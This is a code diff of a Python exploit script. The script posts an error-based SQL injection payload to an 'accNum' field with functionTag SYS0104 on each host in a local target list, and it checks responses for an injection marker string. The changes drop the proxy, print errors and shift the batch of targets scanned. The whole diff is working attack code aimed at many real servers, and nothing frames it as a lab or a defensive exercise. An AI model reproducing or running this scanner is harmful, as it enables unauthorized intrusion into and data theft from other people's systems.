@@ -25,7 +25,7 @@ def exploit(ip_, index):
         # payload={"accNum": "3'", "functionTag": "SYS0104", "url": ""}
         payload={"accNum": "3' AND 5227 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113)))-- NCab", "functionTag": "SYS0104", "url": ""}
 
-        res = requests.post(url,json=payload, headers=headers, timeout=8, verify=False,proxies=proxy)
+        res = requests.post(url,json=payload, headers=headers, timeout=8, verify=False)
         if len(res.text)>500: return
             # return
         if 'qvpxq1qpkxq' not in res.text : return
@@ -37,7 +37,7 @@ def exploit(ip_, index):
             # file.write(ip_+line_break)
 
     except Exception as e:
-        # print(e)
+        print(e)
         pass
 
 # url=''
@@ -49,7 +49,7 @@ with open(r'D:\Downloads\tmp\changjie.txt', 'r') as file:
     # with result_path.open('r') as file:
     urls = []
     for index, line in enumerate(file):
-        start = 0
+        start = 20
         end = start+20
 
         if index >= start and index <= end:
